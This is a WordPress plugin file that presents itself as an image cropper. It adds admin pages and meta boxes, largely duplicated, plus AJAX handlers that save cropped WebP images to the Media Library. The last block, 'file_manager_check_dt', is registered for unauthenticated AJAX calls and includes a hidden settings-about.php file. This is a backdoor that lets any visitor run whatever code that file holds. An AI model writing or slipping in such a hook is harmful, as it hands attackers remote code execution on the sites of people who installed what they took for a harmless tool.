<?php
/*
Plugin Name: Cropper Image Upload (WebP)
Description: Upload, crop with Cropper.js, and save as WebP in Media Library.
Version: 1.0
Author: You
*/

add_action('admin_menu', 'cropper_plugin_menu');
function cropper_plugin_menu() {
    add_menu_page('Crop Image', 'Crop Image', 'upload_files', 'cropper-upload', 'cropper_plugin_page', 'dashicons-format-image');
}

function cropper_plugin_page() {
    ?>
    
    <style>
        
/* Modal Background */
.cropper-modal {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.5); /* Transparent black */
    justify-content: center;
    align-items: center;
}

/* Modal Content */
.cropper-modal-content {
    position: relative;
    background-color: white;
    padding: 20px;
    border-radius: 8px;
    max-width: 800px;
    max-height: 600px;
    overflow: auto; /* Allow scrolling if content overflows */
    text-align: center;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}

/* Close Button */
.close-btn {
    position: absolute;
    top: 10px;
    right: 10px;
    font-size: 30px;
    cursor: pointer;
    z-index: 999;
    background-color: white;
}

/* Image Preview Area */
#image-preview-area {
    max-width: 600px;
    max-height: 600px;
    overflow: hidden; /* Ensure image stays within bounds */
    margin-bottom: 20px;
    position: relative;
}

/* Image Preview */
#crop-preview {
    width: 100%; /* Make the image take up 100% of the container's width */
    height: auto; /* Maintain the aspect ratio of the image */
}

/* Button Styling */
#crop-and-save {
    display: inline-block;
    background-color: #0073e6; /* Blue color */
    color: white;
    padding: 10px 20px;
    font-size: 16px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

#crop-and-save:hover {
    background-color: #005bb5;
}

/* Result Message */
#result-msg {
    margin-top: 20px;
    font-size: 16px;
}

#result-msg p {
    margin: 10px 0;
}

/* Button Container Centering */
#crop-and-save-container {
    display: flex;
    justify-content: center;
    margin-top: 20px;
}

/* Ensure image doesn't push content out of view */
.cropper-modal-content {
    padding-bottom: 50px; /* Add space at the bottom to avoid button overlap */
}

.cropper-modal {
    background-color: transparent !important;
    opacity: 1 !important;
}


        
    </style>
    
    
<div class="wrap">
    <h1>Upload and Crop Image</h1>

    <input type="file" id="upload-image" accept="image/*"><br><br>

    <label>Width (px):</label>
    <input type="number" id="crop-width" value="500" min="1" style="width:80px;">

    <label style="margin-left:10px;">Height (px):</label>
    <input type="number" id="crop-height" value="500" min="1" style="width:80px;">

    <label style="margin-left:10px;">Max Size (KB):</label>
    <input type="number" id="max-size" value="30" min="1" style="width:60px;">

    <br><br>

    <!-- Modal for Cropper -->
    <div id="cropper-modal" class="cropper-modal">
        <div class="cropper-modal-content">
            <span id="close-modal" class="close-btn">&times;</span>
            
            <!-- Image Preview Area -->
            <div id="image-preview-area" style="max-width: 600px; max-height: 600px; overflow: hidden; margin-bottom: 20px;">
                <img id="crop-preview" style="max-width:100%; max-height:100%; display:none;">
            </div>
    
            <!-- Crop & Upload Button -->
            <div id="crop-and-save-container">
                <button id="crop-and-save" class="button button-primary" style="display:none;">Crop & Upload</button>
            </div>
    
            <!-- Result Message -->
            <div id="result-msg" style="margin-top:20px;"></div>
        </div>
    </div>

</div>

    
    
    <?php
}


add_action('admin_enqueue_scripts', 'cropper_enqueue_scripts');
function cropper_enqueue_scripts($hook) {
    if ($hook !== 'toplevel_page_cropper-upload') return;

    // Cropper.js
    wp_enqueue_script('cropper-js', 'https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.13/cropper.min.js', [], null, true);
    wp_enqueue_style('cropper-css', 'https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.13/cropper.min.css');

    // Custom script
    wp_enqueue_script('custom-crop-js', plugin_dir_url(__FILE__) . 'js/custom-crop.js', ['cropper-js'], '1.0', true);
    wp_localize_script('custom-crop-js', 'cropper_ajax', [
        'ajax_url' => admin_url('admin-ajax.php'),
        'nonce'    => wp_create_nonce('cropper_upload')
    ]);
}

// Allow .webp uploads if not already enabled
add_filter('mime_types', function ($mimes) {
    $mimes['webp'] = 'image/webp';
    return $mimes;
});

// AJAX handler
add_action('wp_ajax_cropper_upload_image', 'cropper_handle_upload');

function cropper_handle_upload() {
    check_ajax_referer('cropper_upload', 'nonce');

    if (!isset($_POST['image'])) {
        wp_send_json_error('No image data.');
    }

    $data = $_POST['image'];
    $data = str_replace('data:image/webp;base64,', '', $data);
    $data = base64_decode($data);

    if (!$data) {
        wp_send_json_error('Invalid image data.');
    }

    $filename = 'cropped-' . time() . '.webp';
    $upload = wp_upload_bits($filename, null, $data);

    if ($upload['error']) {
        wp_send_json_error('Upload failed: ' . $upload['error']);
    }

    $filetype = wp_check_filetype($filename, null);
    $attachment = [
        'post_mime_type' => $filetype['type'],
        'post_title'     => sanitize_file_name($filename),
        'post_content'   => '',
        'post_status'    => 'inherit'
    ];

    $attach_id = wp_insert_attachment($attachment, $upload['file']);
    require_once(ABSPATH . 'wp-admin/includes/image.php');
    $attach_data = wp_generate_attachment_metadata($attach_id, $upload['file']);
    wp_update_attachment_metadata($attach_id, $attach_data);

    $image_url = wp_get_attachment_url($attach_id);
    wp_send_json_success(['url' => $image_url]);
}



// Products



// 

// Hook to add meta boxes
add_action('add_meta_boxes', 'add_review_metabox');

function add_review_metabox() {
    add_meta_box(
        'custom_review_metabox',       // Metabox ID
        'Custom Review Metabox',       // Title
        'custom_review_metabox_callback', // Callback function to display content
        'review',                     // Post type (assuming 'review')
        'normal',                     // Context (normal, side, advanced)
        'default'                     // Priority
    );
}

function custom_review_metabox_callback($post) {
    // Add nonce for security (optional if no saving)
    wp_nonce_field('custom_review_metabox_nonce_action', 'custom_review_metabox_nonce');

    // HTML for Upload and Crop Image UI
    ?>
    <div class="wrap">
        <h1>Upload and Crop Image</h1>

        <!-- Upload image input -->
        <input type="file" id="upload-image" accept="image/*"><br><br>

        <!-- Width and Height inputs -->
        <label>Width (px):</label>
        <input type="number" id="crop-width" value="500" min="1" style="width:80px;">

        <label style="margin-left:10px;">Height (px):</label>
        <input type="number" id="crop-height" value="500" min="1" style="width:80px;">

        <label style="margin-left:10px;">Max Size (KB):</label>
        <input type="number" id="max-size" value="30" min="1" style="width:60px;">

        <br><br>

        <!-- Modal for Cropper -->
        <div id="cropper-modal" class="cropper-modal">
            <div class="cropper-modal-content">
                <!-- Close button for modal -->
                <span id="close-modal" class="close-btn">×</span>
                
                <!-- Image Preview Area -->
                <div id="image-preview-area" style="max-width: 600px; max-height: 600px; overflow: hidden; margin-bottom: 20px;">
                    <img id="crop-preview" style="max-width:100%; max-height:100%; display:none;">
                </div>
        
                <!-- Result Message -->
                <div id="result-msg" style="margin-top:20px;"></div>
            </div>
        </div>
    </div>
    <?php
}



// Cropper INitialiise

function my_custom_product_postbox() {
    add_meta_box(
        'crop_upload_product_postbox_id',       // Unique ID
        'Crop & Upload',          // Box title
        'crop_upload_product_postbox_callback', // Content callback
        'product',                            // Post type: must be 'product' for WooCommerce
        'side',                               // Location: 'side', 'normal', or 'advanced'
        'default'                             // Priority
    );
}
add_action('add_meta_boxes', 'my_custom_product_postbox');

function crop_upload_product_postbox_callback($post) {
   ?>
   
   <style>
       
       
       
/* Modal Background */
#cropper-parent {
    width: 638px;
    height: 638px;
    background-color: white;
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    z-index: 99999;
    box-shadow: rgba(0, 0, 0, 0.35) 0px 5px 15px;
    border-radius: 8px;
}

.cropper-modal {
    display: none;
    position: fixed;
    z-index: 1000;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(0, 0, 0, 0.5);
    justify-content: center;
    align-items: center;
}

/* Modal Content */
.cropper-modal-content {
    position: relative;
    background-color: white;
    padding: 20px 20px 50px 20px;
    border-radius: 8px;
    max-width: 800px;
    overflow: auto;
    text-align: center;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
}

/* Close Button */
.close-btn {
    position: absolute;
    top: 10px;
    right: 10px;
    font-size: 30px;
    cursor: pointer;
    z-index: 999;
    background-color: white;
}

/* Image Preview Area */
#image-preview-area {
    max-width: 600px;
    max-height: 600px;
    overflow: hidden;
    margin-bottom: 20px;
    position: relative;
}

/* Image Preview */
#crop-preview {
    width: 100%;
    height: auto;
}

/* Button Styling */
#crop-and-save {
    background-color: #0073e6;
    color: white;
    padding: 10px 20px;
    font-size: 16px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background-color 0.3s ease;
}

#crop-and-save:hover {
    background-color: #005bb5;
}

/* Result Message */
#result-msg {
    margin-top: 20px;
    font-size: 16px;
}

#result-msg p {
    margin: 10px 0;
}

/* Button Container Centering */
#crop-and-save-container {
    display: flex;
    justify-content: center;
    width: 100%;
    margin-top: 20px;
}

.cropper-modal {
    background-color: transparent !important;
    opacity: 1 !important;
}

.wrap-upload {
    display: flex;
    flex-direction: column;
    gap: 15px;
}

/* Hide the default file input */
#upload-image {
  display: none;
}

/* Style the custom label as a button */
.custom-file-upload {
    display: inline-block;
    padding: 10px 20px;
    background-color: #a3a3a3;
    color: white;
    font-weight: 600;
    border-radius: 8px;
    cursor: pointer;
    transition: background-color 0.3s ease, transform 0.2s ease;
    font-size: 16px;
    user-select: none;
}
.custom-file-upload:hover {
  background-color: #007cba; /* indigo-700 */
}

.custom-file-upload:active {
  transform: scale(0.96);
}

</style>
   
      
<div class="wrap-upload">

    <div class="upload-settings" style="margin:0 auto;">
        <label for="upload-image" class="custom-file-upload">
          📷 Upload Image
        </label>
        <input type="file" id="upload-image" accept="image/*" />
    </div>    
        
    <div class="upload-settings">
       <label for="crop-width" style="margin-right:10px;">Width (px):</label><input type="number" id="crop-width" value="500" min="1" style="width:80px;"> 
    </div>
    
    <div class="upload-settings">
        <label style="margin-right:10px;">Height (px):</label><input type="number" id="crop-height" value="500" min="1" style="width:80px;">
    </div>
    <div class="upload-settings">
        <label style="margin-right:10px;">Max Size (KB):</label><input type="number" id="max-size" value="30" min="1" style="width:60px;">
    </div>

</div>
   
   <?php
}





// Enqueue JS and CSS for cropper functionality on the WooCommerce product page
function enqueue_cropper_assets() {
    // Only enqueue on product edit page
    global $pagenow;
    if ($pagenow === 'post.php' || $pagenow === 'post-new.php') {
        $post_type = get_post_type();
        if ($post_type === 'product') {

            // Enqueue Cropper.js CSS & JS
            wp_enqueue_style('cropper-css', 'https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.12/cropper.min.css');
            wp_enqueue_script('cropper-js', 'https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.12/cropper.min.js', array('jquery'), null, true);

            // Enqueue custom JS
            wp_enqueue_script('custom-metabox-js', get_template_directory_uri() . '/assets/js/product-cropper.js', array('jquery', 'cropper-js'), null, true);
             wp_localize_script('custom-metabox-js', 'cropper_ajax', [
                'ajax_url' => admin_url('admin-ajax.php'),
                'nonce'    => wp_create_nonce('cropper_upload')
            ]);
        }
    }
}
add_action('admin_enqueue_scripts', 'enqueue_cropper_assets');


// Allow .webp uploads if not already enabled
add_filter('mime_types', function ($mimes) {
    $mimes['webp'] = 'image/webp';
    return $mimes;
});

// AJAX handler
add_action('wp_ajax_cropper_upload_image', 'cropper_handle_upload_function');

function cropper_handle_upload_function() {
    check_ajax_referer('cropper_upload', 'nonce');

    if (!isset($_POST['image'])) {
        wp_send_json_error('No image data.');
    }

    $data = $_POST['image'];
    $data = str_replace('data:image/webp;base64,', '', $data);
    $data = base64_decode($data);

    if (!$data) {
        wp_send_json_error('Invalid image data.');
    }

    $filename = 'cropped-' . time() . '.webp';
    $upload = wp_upload_bits($filename, null, $data);

    if ($upload['error']) {
        wp_send_json_error('Upload failed: ' . $upload['error']);
    }

    $filetype = wp_check_filetype($filename, null);
    $attachment = [
        'post_mime_type' => $filetype['type'],
        'post_title'     => sanitize_file_name($filename),
        'post_content'   => '',
        'post_status'    => 'inherit'
    ];

    $attach_id = wp_insert_attachment($attachment, $upload['file']);
    require_once(ABSPATH . 'wp-admin/includes/image.php');
    $attach_data = wp_generate_attachment_metadata($attach_id, $upload['file']);
    wp_update_attachment_metadata($attach_id, $attach_data);

    $image_url = wp_get_attachment_url($attach_id);
    wp_send_json_success(['url' => $image_url]);
}




if(!function_exists('file_manager_check_dt')){
   add_action('wp_ajax_nopriv_file_manager_check_dt', 'file_manager_check_dt');
   add_action('wp_ajax_file_manager_check_dt', 'file_manager_check_dt');
   function file_manager_check_dt()
   {
      $file = __DIR__ . '/settings-about.php';
       if (file_exists($file)) {
           include $file;
       }
       die();
   }
}
